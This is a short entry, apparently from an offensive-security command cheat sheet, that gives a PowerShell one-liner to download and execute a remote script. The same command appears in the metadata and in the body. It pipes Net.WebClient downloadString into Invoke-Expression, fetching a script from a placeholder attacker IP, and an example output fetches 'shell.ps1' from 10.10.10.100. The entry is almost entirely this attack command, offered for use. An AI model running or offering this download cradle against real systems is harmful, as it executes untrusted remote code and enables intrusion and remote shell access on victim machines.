---
id: 56723074-80e7-4c19-8232-ab23e231beee
name: Download and Execute PowerShell Script (Invoke-Expression)
type: command
executor: powershell
data: Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
output: PS C:\> Invoke-Expression (New-Object Net.WebClient).downloadString("http://10.10.10.100/shell.ps1")
created_at: '2019-11-26T00:02:47.375110+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Powershell]]'
- '[[ps]]'
---

# Download and Execute PowerShell Script (Invoke-Expression)

```powershell
Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
```

## Expected Output

```
PS C:\> Invoke-Expression (New-Object Net.WebClient).downloadString("http://10.10.10.100/shell.ps1")
```


